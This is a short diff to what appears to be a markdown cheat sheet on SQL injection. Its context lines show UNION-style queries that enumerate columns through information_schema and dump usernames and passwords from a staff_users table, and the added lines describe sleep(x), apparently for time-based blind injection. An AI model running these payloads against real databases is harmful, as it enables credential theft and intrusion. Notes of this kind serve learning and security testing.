@@ -110,3 +110,7 @@ SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table
 
 SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
 ```
+
+## sleep(x)
+
+Sleeps (pauses) for `x` **seconds**, then returns 0.
